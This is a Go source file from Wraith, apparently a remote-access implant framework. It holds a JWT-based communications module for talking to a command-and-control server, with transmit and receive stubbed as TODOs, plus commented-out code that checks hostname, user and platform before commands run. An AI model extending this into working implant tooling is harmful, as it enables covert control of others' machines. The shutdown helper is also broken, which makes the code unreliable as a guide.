package stdmod

import (
	"fmt"
	"sync"
	"time"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/libwraith"
)

// A struct to store various configuration properties of the DefaultJWTCommsManager.
// Not all CommsManagers have this, but it helps for more general-purpose managers
// like this one, to tweak behaviour.
type DefaultJWTCommsManagerConfig struct {
}

// A CommsManager module implementation which utilises (optionally) encrypted JWT
// as a base for its transfer protocol. This allows messages to be signed and
// verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
// particularly advanced features and is meant as a simple default which does a
// good job in most usecases.
type DefaultJWTCommsManager struct {
	wraith       *libwraith.Wraith
	exitTrigger  chan struct{}
	running      bool
	runningMutex sync.Mutex

	// A property used to configure various behaviours of this CommsManager.
	Conf DefaultJWTCommsManagerConfig
}

// Spawn a channel which is triggered when the m.running condition is false
func (m *DefaultJWTCommsManager) exitChannel() chan struct{} {
	exitChannel := make(chan struct{})
	go func() {
		// Regularly check m.running
		for m.running {
			// Stop the loop from spinning and using 100% CPU
			<-time.After(200 * time.Millisecond)
		}
	}()
	return exitChannel
}

func (m *DefaultJWTCommsManager) WraithModuleInit(w *libwraith.Wraith) {
	// Save pointer to Wraith for future (de)reference
	m.wraith = w

	// Init properties
	m.exitTrigger = make(chan struct{})
	m.running = false // no need to lock - this is guaranteed to run before any attempts to start the module
}

func (m *DefaultJWTCommsManager) Start() error {
	// Ensure this instance is only started once and mark as running if so
	m.runningMutex.Lock()
	if m.running {
		m.runningMutex.Unlock()
		return fmt.Errorf("already running")
	}
	m.running = true
	m.runningMutex.Unlock()

	// Start the main body of the module in a goroutine
	go func() {
		// Watch shm cells required by this module
		txQueue, txQueueWatchId := m.wraith.SHMWatch(libwraith.SHM_TX_QUEUE)
		rxQueue, rxQueueWatchId := m.wraith.SHMWatch(libwraith.SHM_RX_QUEUE)

		// Always cleanup and clear running status when exiting goroutine
		defer func() {
			// Mark comms as not ready in shm
			// Ignore err return because we know this isn't a protected cell
			_ = m.wraith.SHMSet(libwraith.SHM_COMMS_READY, false)

			// Unwatch cells
			m.wraith.SHMUnwatch(libwraith.SHM_TX_QUEUE, txQueueWatchId)
			m.wraith.SHMUnwatch(libwraith.SHM_RX_QUEUE, rxQueueWatchId)

			// Mark as not running internally
			m.runningMutex.Lock()
			m.running = false
			m.runningMutex.Unlock()
		}()

		// Mark comms as ready in shm
		m.wraith.SHMSet(libwraith.SHM_COMMS_READY, true)

		// Mainloop
		for {
			select {
			// Trigger exit when requested
			case <-m.exitTrigger:
				return
			// Manage transfer queue
			case <-txQueue: // TODO
			// Manage receive queue
			case <-rxQueue: // TODO
			}
		}
	}()

	// Return control to Wraith
	return nil
}

func (m *DefaultJWTCommsManager) Stop() error {
	// Request exit of mainloop
	m.exitTrigger <- struct{}{}

	// Wait for mainloop to exit, with timeout
	select {
	case <-m.exitChannel():
		return nil
	case <-time.After(10 * time.Second):
		return fmt.Errorf("timeout while waiting for mainloop to exit")
	}
}

// Return the name of this module as libwraith.MOD_COMMS_MANAGER
func (m *DefaultJWTCommsManager) Name() string {
	return libwraith.MOD_COMMS_MANAGER
}

/*
func (m *JWTModule) WraithModuleInit(wraith *libwraith.Wraith) {}
func (m *JWTModule) ProtoLangModule()                          {}

func (m *JWTModule) Encode(data map[string]interface{}) ([]byte, error) {
	var claims jwt.Claims

	// Put all data under "w" key
	claims.Set = map[string]interface{}{"w": data}

	return claims.EdDSASign(m.EncodeKey)
}

func (m *JWTModule) Decode(data []byte) (map[string]interface{}, error) {
	// Attempt to parse given data
	claims, err := jwt.EdDSACheck(data, m.DecodeKey)

	// Directly return error if it exists
	if err != nil {
		return nil, err
	}

	// Make sure the token is valid, don't execute expired tokens
	if !claims.Valid(time.Now()) {
		return nil, fmt.Errorf("token parsed but invalid")
	}

	// Make sure that the token has a "w" key
	if wKey, ok := claims.Set["w"]; !ok {
		return nil, fmt.Errorf("no \"w\" key found")

		// Make sure the "w" key is map[string]interface{} as expected
	} else if wKeyMap, ok := wKey.(map[string]interface{}); !ok {
		return nil, fmt.Errorf("\"w\" key is unexpected type")

		// If all is well, return the data from "w" key
	} else {
		return wKeyMap, nil
	}
}

func (m *JWTModule) Identify(data []byte) bool {
	// Attempt to parse the token to check whether it is, in fact, a token.
	// Do not yet attempt to verify the signature, that should be done later
	// when we actually try to use the data within the token.
	claims, err := jwt.ParseWithoutCheck(data)
	if err != nil {
		return false
	}

	// Despite being a JWT, this token might not be the type of JWT we're looking
	// for. Check that it contains the `w` key.
	if wKey, ok := claims.Set["w"]; !ok {
		return false

		// Finally, check that the `w` key is a map[string]interface{} as expected.
	} else if _, ok := wKey.(map[string]interface{}); !ok {
		return false
	}

	// All checks have passed, this is likely an example of data we can handle
	return true
}

//
//
//

type ValidityModule struct {
	wraith *libwraith.Wraith
}

func (m *ValidityModule) WraithModuleInit(wraith *libwraith.Wraith) {
	m.wraith = wraith
}
func (m *ValidityModule) ProtoPartModule() {}

func (m *ValidityModule) ProcessProtoPart(hkvs *libwraith.HandlerKeyValueStore, data interface{}) {
	isValid := false

	defer func() {
		if isValid {
			hkvs.Set("validity.valid", true)
		} else {
			hkvs.Set("validity.valid", false)
		}
	}()

	// Enforce validity constraints

	// If there are validity constraints (this function was called), but they are incorrectly formatted,
	// always assume invalid
	if validity, ok := data.(map[string]string); ok {
		// Wraith Fingerprint/ID restriction
		if constraint, ok := validity["wfpt"]; ok {
			// Always fail if an ID restriction is present and Wraith has not been given an ID
			if m.wraith.Conf.Fingerprint == "" {
				return
			}
			match, err := regexp.Match(constraint, []byte(m.wraith.Conf.Fingerprint))
			if !match || err != nil {
				// If the constraint was not satisfied, the data should be dropped
				// If there was an error in checking the match, Wraith will fallback to fail
				// as to avoid running erroneous commands on every Wraith.
				return
			}
		}

		// Host Fingerprint/ID restriction
		if constraint, ok := validity["hfpt"]; ok {
			match, err := regexp.Match(constraint, []byte{}) // TODO
			if !match || err != nil {
				return
			}
		}

		// Hostname restriction
		if constraint, ok := validity["hnme"]; ok {
			hostname, err := os.Hostname()
			if err != nil {
				// Always fail if hostname could not be checked
				return
			}
			match, err := regexp.Match(constraint, []byte(hostname))
			if !match || err != nil {
				return
			}
		}

		// Running username restriction
		if constraint, ok := validity["rusr"]; ok {
			user, err := user.Current()
			if err != nil {
				return
			}
			match, err := regexp.Match(constraint, []byte(user.Username))
			if !match || err != nil {
				return
			}
		}

		// Platform (os/arch) restriction
		if constraint, ok := validity["plfm"]; ok {
			platform := fmt.Sprintf("%s|%s", runtime.GOOS, runtime.GOARCH)
			match, err := regexp.Match(constraint, []byte(platform))
			if !match || err != nil {
				return
			}
		}

		// If we got this far, all checks passed so the payload is valid
		isValid = true
		return
	} else {
		return
	}
}
*/
